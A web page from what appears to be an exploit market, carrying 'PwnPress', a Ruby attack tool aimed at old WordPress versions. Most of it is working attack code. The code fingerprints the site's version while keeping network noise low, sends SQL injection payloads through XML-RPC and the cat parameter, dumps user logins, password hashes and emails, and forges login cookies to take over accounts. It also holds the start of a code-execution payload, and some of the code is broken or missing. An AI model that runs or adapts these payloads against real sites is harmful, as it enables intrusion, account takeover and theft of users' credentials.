			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1591956699' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1591956699' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/2133'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/2133'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/2133'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/2133'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/2133'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/2133'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/2133'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/2133'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/2133'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/2133'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/2133'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/2133'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/plain'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1591956699'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/473' target=_blank>Lance M. Havok</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_0.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_0'>Security Risk Unsored</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/2133' target=_blank>0day-ID-2133</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/webapps'>web applications</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/14-09-2007'>14-09-2007</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' >unsorted</div>
									
									
								<div class='clear'></div>
									
							</div>
=================================================================




#!/usr/bin/env ruby
#                .---. .---.
#               :     : o   :    happy antiblogging, dear kids!
#           _..-:   0 :     :-.._    /
#       .-''  '  `---' `---' "   ``-.         Copyright (c) Lance M. Havok
#     .'   "   '  "  .    "  . '  "  `.       
#    :   '.---.,,.,...,.,.,.,..---.  ' ;
#    `. " `.                     .' " .'      ----- All rights reserved.
#     `.  '`.   .-/|||||||\-.   .' ' .'       2006, 2007.
#      `.    `-._   \|||/   _.-' "  .'
#        `. "    '"--...--"'  . ' .'    ...because blogs are useless
#  jgs   .'`-._'    " .     " _.-'`.       self-promotion and mental
#      .'      ```--.....--'''    ' `:               masturbation...
#   "The blogosphere end is fucking nigh!"
#                                              -RELEASE LESS, RELEASE BEST-
# == Disclaimer and license
# This code is *NOT* GPL. Commercial usage is strictly forbidden (any activity
# directly or indirectly generating revenue: consulting, distribution in slides,
# mirroring in websites with ad/affiliate programs, advertise your web IDS, etc).
#
# retrieving any necessary information to make the exploitation process as
# reliable as possible. Because every time you 'blog', god mutilates the penis
# of a poor 12 year old Vietnamese boy.
#
# Covertness capability is provided, dynamically adapting the payloads and
# operations to lower potential 'noise' on the wire. Fingerprinting deploys few
# form without tampering of wp-includes/version.php
#
# Apache 2.0.58 on Gentoo GNU/Linux. magic_quotes on and off for the different
# exploits.
#
# == A short advice (for those who desperately need a working brain)
# Due to the recent incidents of people ripping some of our work at Blackhat and
# other *pointless* security conferences, we politely ask you to refrain from
# doing such a mean thing. If you can't be creative, find a different hobby.
# "DANGER RABBI ROBINSON: INFOWAR!" Gadi Evron, blogs.securiteam.com (WP 2.0.10)
# Trespassers expect career disruption and public humiliation... :)
#

require 'digest/md5'
require 'net/http'
require 'base64'
require 'irb'
require 'uri'

class Array
    # Return random item
    def rand_i
        return self[rand(self.size)]
    end
end

class String
    # http://snippets.dzone.com/posts/show/2111
    def self.rnd(size = 16)
        (1..size).collect { (i = Kernel.rand(62);
        i += ((i < 10) ? 48 : ((i < 36) ? 55 : 61 ))).chr }.join
    end
end

# Oh jesuschrist, here comes the pie!
    PWNPRESS_VERSION         = "0.2pub"
    LATEST_VERSION_SUPPORTED = "2.2.2"
    DEFAULT_TABLE_PREFIX     = "wp"
    KNOWN_REGEXPS            = {
        :meta_generator => /<meta name="generator" content="(.+?)" \/>/,
        :rss_feed_links =>
            [
                /title="RSS 2.0" href="(.*)"/,
                /title="RSS .92" href="(.*)"/
                
            ],
        :atom_feed_links =>
            [
                /title="Atom 0.3" href="(.*)"/
            ],
        :rss2_generator =>
            [
                /generator="(.+?)"/
            ],
        :atom_generator =>
            [
                # This fixes dumb editors with stupid syntax highlighting :)"
            ]
    }
    
    attr_reader :results
    
    # Initialize the instance variables, etc. Perform any required operations
    # to set the initial state ready.
    def initialize(options)
        unless options[:target] != nil
            raise "Missing target URL parameter."
        end
        
        # Check for missing trailing slash, add if necessary
        if options[:target].split(//).last != '/'
            options[:target] << '/'
        end
        
        
        @url          = URI.parse(options[:target])
        @proxy_host   = options[:proxy_host]
        @proxy_port   = options[:proxy_port]
        @username     = options[:username]
        @password     = options[:password]
        @covert_level = options[:covert_level]
        @results      = {}
        @finger_on    = options[:fingerprint]
        
        if options[:version] == "auto"
            if @version
                msg_desc = %Q{
                    Target has #{@version} installed. Current last
                    release (devel) is #{@wp_versions.last}. Known
                    versions: #{@wp_versions.size} (includes devel).
                }
                
                add_results_msg(:wp_version, :success, msg_name, msg_desc)
            else
                msg_desc = %Q{
                    It might be fake or bogus. Please specify target
                    version yourself, since fingerprinting failed :(
                }
                
                add_results_msg(:wp_version, :failure, msg_name, msg_desc)
            end
        else
            @version = options[:version]
        end
        
    end
    
    #
    # 1. Default installation contains a META generator header.
    # 2. Default RSS/ATOM feed generation code also provides version information.
    # 3. Default template and most styles include "Powered by" text.
    #
    #     <meta name="generator" content="WordPress 2.2.2" />
    #     <generator url="http://...org/" version="1.5.2">WordPress</generator>
    #
    # The above methods can be fooled by simply editing wp-includes/version.php
    # Covert level affects what methods might be used, depending on how clumsy
    # the activity could be on the wire. Fingerprinting is highly effective in
    # most cases but there are still users who decide to fake version strings,
    # therefore a method using some heuristics is provided as well. Obviously it
    # can be fooled as easily, but helps to identify branch and feature sets.
    #
    # Methods involving extremely simple "heuristics":
    #
    # 4. Detect the style and layout of the login interface.
    # 6. Detect plugins and themes or styles available only for some branches.
    #
    # This list isn't exhaustive, there are other potentially reliable
    # methods (depending on desired attack surface: default installation, custom
    # blogs, heavily modified code, etc). Ski ba bop ba dop bop!
    #
        index_paths = [ "index.php", "?#comments" ]
        rss2_paths  = [ "?feed=rss2", "?feed=comments-rss2" ]
        atom_paths  = [ "?feed=atom", "?feed=comments-atom" ]
        
        unless @body
            @body = retrieve_content(index_paths.rand_i)
            if @body == nil
                raise "HTTP GET failed: wrong path or offline?"
            end
        end
        
        if @body and only_retrieve_body == false and @finger_on
            get_valid_versions_array

            # Retrieve existing RSS and ATOM feed paths. Note that this will
            # different base url, then these checks won't use it.
            KNOWN_REGEXPS[:rss_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                rss2_paths << uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            KNOWN_REGEXPS[:atom_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                atom_paths << uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            # Method 1
            meta_generator = @body.scan(KNOWN_REGEXPS[:meta_generator]).flatten
            if meta_generator
                wp_string = meta_generator[0].scan(/(.+?) (.*)/).flatten
                if wp_string.size ==  2
                    if wp_string[0] =~ /Word(p|P)ress/i
                        if wp_string[1]
                            # Verify version against those known to be valid
                            if @wp_versions.find { |v| v[0] == wp_string[1] }
                                return wp_string[1]
                            end
                        end
                    end
                end
            end
            
            # Note: could refactor these two as a method and save some lines,
            # but this is the only existing place where it would be used.
            # Method 2: RSS
            rss2 = get_meta_value(rss2_paths.rand_i, :rss2_generator)
            if rss2 and rss2[:str]
                ver = rss2[:str].scan(/(.*)\/(.*)/).flatten
                if ver and ver.size == 2
                    if @wp_versions.find { |v| v[0] == ver[1] }
                        return ver[1]
                    end
                end
            end
            
            # Method 2: ATOM
            atom = get_meta_value(atom_paths.rand_i, :atom_generator)
            if atom and atom[:str]
                if @wp_versions.find { |v| v[0] == atom[:str] }
                    return atom[:str]
                end
            end
            
            # Method 4: determine login box layout and/or style. works for
            # Besides that, this isn't of much help.
            if @covert_level < 1
                login_body = retrieve_content("wp-login.php")
                if login_body =~ /<html xmlns="http:\/\/www.w3.org\/1999\/xhtml" dir="ltr">/
                    return "post-2.2"
                end
                if login_body =~ /<html xmlns="http:\/\/www.w3.org\/1999\/xhtml">/
                end
            end
            
            # Method 5: branch-persistent files
            if @covert_level < 1
                # wp-app.php and wp-cron.php are from old 1.5 branch
                if retrieve_content("wp-app.php", @url, nil, true).code == "404"
                    return "likely-2.2"
                else
                    return "likely-1.5"
                end
            end
            
            # Method 3: final, we return nil since we really cant tell an exact
            # version.
                return nil
            end
        end
    end
    
    # A brilliant bug fixed after 2.2(.0) which was exploitable by least
    # privileged users (ex. Subscribers) via the XML-RPC interface:
    #
    #   function wp_suggestCategories($args) {
    #   ...
    #       $this->escape($args);
    #       $blog_id                = (int) $args[0];
    #       ...
    #       $max_results            = $args[4];           !! where's mr. (int)?
    #       ...
    #       if(!empty($max_results)) {
    #           $limit = "LIMIT {$max_results}";          !! :>
    #
    #     $category_suggestions = $wpdb->get_results("    !! "I see dead SQL :("
    #       SELECT cat_ID category_id,
    #           cat_name category_name
    #       FROM {$wpdb->categories}
    #       WHERE cat_name LIKE '{$category}%'
    #       {$limit}                                      !! kekekekekekeKEKEKE!
    #       ");
    #
    #   return($category_suggestions);
    #
    # development team by Alex C, with a .NET C# proof of concept.
    #
    def exploit_220_suggestCategories_xmlrpc
        if @username and  @password
            user_list    = {}
            xmlrpc_path  = get_xmlrpc_path()
            xml_payload  =  "<methodCall>\n"                                   +
                            "\t<methodName>wp.suggestCategories</methodName>\n"+
                            "\t<params>\n"                                     +
                            "\t\t<param><value>1</value></param>\n"            +
                            "\t\t<param><value>#{@username}</value></param>\n" +
                            "\t\t<param><value>#{@password}</value></param>\n" +
                            "\t\t<param><value>1</value></param>\n"            +
                            "\t\t<param><value>"                               +
                            "0 UNION ALL SELECT user_login, user_pass FROM "   +
                            "WPR3F1X_users"                                    +
                            "</value></param>\n"                               +
                            "\t</params>\n"                                    +
                            "</methodCall>\n"
           
           # Send the query
           if xmlrpc_path
               
                                 xmlrpc_path)
               if res =~ /Word(P|p)ress database error/ and @covert_level < 1
                                     xmlrpc_path)
               end
               
               # No need for a full-blown XML parser. Ruby is *that* nice :>
               if res =~ /<member><name>category_id<\/name><value><string>/
                   regex = /<member><name>(.+?)<\/name><value><string>(.+?)<\/string><\/value><\/member>/
                   credentials = res.scan(regex)
                   last_user = nil
                   
                   credentials.each do |a|
                      if a[0] == "category_id" and a[1]
                          user_list[a[1]] = { :passwd_hash => nil }
                          last_user = a[1]
                      end
                      if a[0] == "category_name" and a[1]
                          user_list[last_user][:passwd_hash] = a[1]
                          cookie = get_cookie_hash(last_user, a[1])
                          if cookie and cookie.size == 2
                              user_list[last_user][:cookie_user] = cookie[0]
                              user_list[last_user][:cookie_pass] = cookie[1]
                          end
                      end
                   end
                   
                   add_to_results(:sql_injection_xmlrpc_220, :user_hashes,
                                  user_list)
                   return true
               end
               
               # Did not work :(
               return false
           end
        else
            raise "Username and password required for XML-RPC injection in 2.2"
        end
    end
    
    # doing the job just fine, with magic_quotes = Off. This is a cleaner version
    # with few extra checks. Like the original Perl version, uses base64 to avoid
    # char filtering woes and as a side-effect (bonus!) for mod_security evasion
    # :> (thanks to XML-RPC handling, which supports base64 encoded elements).
    #
    def exploit_222_pingback_xmlrpc
        user_list = {}
        tags_list = []
        xmlrpc_path  = get_xmlrpc_path()
        
        
        # First we need to scan for some tags (categories), this is most likely
        # compliant (or follows the usual scheme).
        tags_list = get_existing_tags()
        unless tags_list.size > 0
            msgs = { :failure => { :response => "Can't find suitable tag." } }
            msgs[:failure][:description] = %Q{
                \t A suitable permalink-style path is required for the exploit
                \t to be successful. Failure to find this parameter indicates
                \t that most probably the target is not using URL rewrite rules.
                \t The bug does not trigger with "emulated" index.php/ style
                \t paths.
            }
            
            add_to_results(:sql_injection_xmlrpc_222, :messages, msgs)
            return false
        end
        
        sql_query =  tags_list.rand_i[:link]
        sql_query << "#{String.rnd}&post_type=#{String.rnd}\%27)"
        sql_query << " UNION SELECT CONCAT(user_pass, \%27 - \%27, user_login,"
        sql_query << " \%27 - \%27, user_email), 2,3,4,5,6,7,8,9,10,11,12,13,"
        sql_query << "14,15,16,17,18,19,20,21,22,23,24 FROM "
        sql_query << "WPR3F1X_users\%2F*"
        
        xml_payload  =  "<?xml version=\"1.0\"?>\n"                           +
                        "<methodCall>\n\t<methodName>"                        +
                        "pingback.extensions.getPingbacks"                    +
                        "</methodName>\n"                                     +
                        "\t<base64>INJ_SQL_QUERY</base64>\n"                  +
                        "</methodCall>\n"
       
        # Send the query
        if xmlrpc_path
            tmp = xml_payload.gsub(/INJ_SQL_QUERY/, Base64.encode64(tmp))
            res = send_xmlrpc(tmp, xmlrpc_path)
            
            if res =~ /Word(P|p)ress database error/ and @covert_level < 1
                tmp = xml_payload.gsub(/INJ_SQL_QUERY/, Base64.encode64(tmp))
                res = send_xmlrpc(tmp, xmlrpc_path)
            end
            
            wpuser_blob = res.scan(/WHERE post_id IN \((.*?)\)/s).flatten[0]
            credentials = wpuser_blob.scan(/([a-z0-9]{32}) \- (.*?) \- ([^,]+)/i)
            credentials.each do |a|
                password_hash = a[0]
                poor_username = a[1]
                email_address = a[2]
                
                user_list[poor_username] = {
                    :email_addr  => email_address,
                    :passwd_hash => password_hash
                }
                
                cookie = get_cookie_hash(poor_username, password_hash)
                if cookie and cookie.size == 2
                    user_list[poor_username][:cookie_user] = cookie[0]
                    user_list[poor_username][:cookie_pass] = cookie[1]
                end
            end
            
            add_to_results(:sql_injection_xmlrpc_222, :user_hashes, user_list)
            return true
        end
        
        return false
    end

    # One of the most sloppy, unreliable and awkward exploits ever released for
    # No offense meant, it was just a seriously deficient piece of horse shit.
    def exploit_205_trackback_utf7
        wpuser_list = {}
        sql_query = ""
        # Left to be implemented someday...
    end
    
    # Present in 1.5.1.1, this one allows dead easy SQL injection (ex. via cat
    # variable, for category, in the index page right away). The SQL query here
    # is loosely based on the original exploit by Alberto Trivero, with extra
    # output. Also, we support multiple user dumping by limiting the query per
    # id, and iterating randomly if covert level allows it (since we are doing
    # a GET request, as clumsy as cmd.exe at packages.gentoo.org :>).
    def exploit_1511_catsqlinjection
        user_list = {}
        
        sql_query = "#{rand(40)} UNION SELECT NULL,CONCAT(CHAR(58),user_pass,"
        sql_query << "CHAR(58),user_email,CHAR(58),user_login,CHAR(58)),2,"
        sql_query << "NULL,NULL FROM WPR3F1X_users WHERE id = TUSER/*"

        
        
        if @covert_level > 1
            iterations = 1
        else
            iterations = rand(20)+1
        end
        
        user_id = 1
        iterations.times do
            tmp = sql_query.gsub(/TUSER/, user_id.to_s)
            
            res = retrieve_content("?cat=#{tmp}")
            if res =~ /Word(P|p)ress database error/ and @covert_level < 1
                    tmp = sql_query.gsub(/TUSER/, user_id.to_s)
                    res = retrieve_content("?cat=#{tmp}")
            end
            
            if res
                val = res.scan(/:([a-z0-9]{32}):(.*?):(.*?): category/).flatten
                if val.size == 3
                    user_list[val[2]] = {
                        :email_addr  => val[1],
                        :passwd_hash => val[0]
                    }
                    
                    cookie = get_cookie_hash(val[2], val[0])
                    if cookie and cookie.size == 2
                        user_list[val[2]][:cookie_user] = cookie[0]
                        user_list[val[2]][:cookie_pass] = cookie[1]
                    end
                end
            end
            
            user_id += 1
        end
        
        if user_list.size > 0
            add_to_results(:sql_injection_cat_1513, :user_hashes, user_list)
            return true
        else
            return false
        end
    end
    
    # A code execution flaw in 1.5.1.3 when register_globals is enabled. Allows
    # simple exploitation via variables overwrite. The technique is based on
    # the original exploit by Kartoffelguru, using a base64 encoded command.
    def exploit_1513_codeexec
        cookie_template = "wp_filter[query_vars][0][0][function]=get_lastpostdate;"
        cookie_template << "wp_filter[query_vars][0][0][accepted_args]=0;"
        cookie_template << "wp_filter[query_vars][0][1][function]=base64_decode;"
        cookie_template << "wp_filter[query_vars][0][1][accepted_args]=1;"
        cookie_template << "cache_lastpostmodified[server]=//e;"
        cookie_template << "cache_lastpostdate[server]=BASE64CMD;"
        cookie_template << "wp_filter[query_vars][1][0][function]=parse_str;"
        cookie_template << "wp_filter[query_vars][1][0][accepted_args]=1;"
        cookie_template << "wp_filter[query_vars][2][0][function]=get_lastpostmodified;"
        cookie_template << "wp_filter[query_vars][2][0][accepted_args]=0;"
        cookie_template << "wp_filter[query_vars][3][0][accepted_args]=3;"
        
        # $code = base64_encode($cmd);
        # $cnv = "";
        # for ($i=0;$i<strlen($code); $i++) {
        # $cnv.= "chr(".ord($code[$i]).").";
        # }
        # $cnv.="chr(32)";
        # $str = base64_encode('args[0]=eval(base64_decode('.$cnv.')).die()&args[1]=x');

        #cmd = Base64.encode64(cmd).scan(/.{1,600}/o).to_s
        #tmp = cookie_template.gsub(/BASE64CMD/, cmd)
        # TODO :)
    end
    
    # Determine what exploits could work against the target version. Chain them
    # inside an array and then sequentially execute the methods. These are
    # ordered depending on the reliability, and used according to the desired
    # covert level.
    def exploit
        @ammunition = []
        
        case @version
            when "1.5.1.1"
                @ammunition << exploit_1511_catsqlinjection
            when "1.5.1.3"
                @ammunition << exploit_1513_codeexec
            when "2.0.5"
                @ammunition << exploit_205_trackback_utf7
            when "2.1.3"
            when "2.2"
                @ammunition << exploit_220_suggestCategories_xmlrpc
                @ammunition << exploit_222_pingback_xmlrpc
            when "2.2.2"
                @ammunition << exploit_222_pingback_xmlrpc
            else
                return false
        end
        
        # What would Jesus do?
        @ammunition.each do |headshot|
            headshot
        end
    end
    
    # Retrieve the site hash using a HEAD request, taking username and password
    # hash for filling a valid cookie which can be used to operate the target
    # account without requiring the password. This can be set in Firefox by
    # editing the cookies.txt file or using the proper extension providing cookie
    # editing functionality. Uses random headers.
    def get_cookie_hash(username, phash)
        login_path = @url.path + "wp-login.php?action=logout"
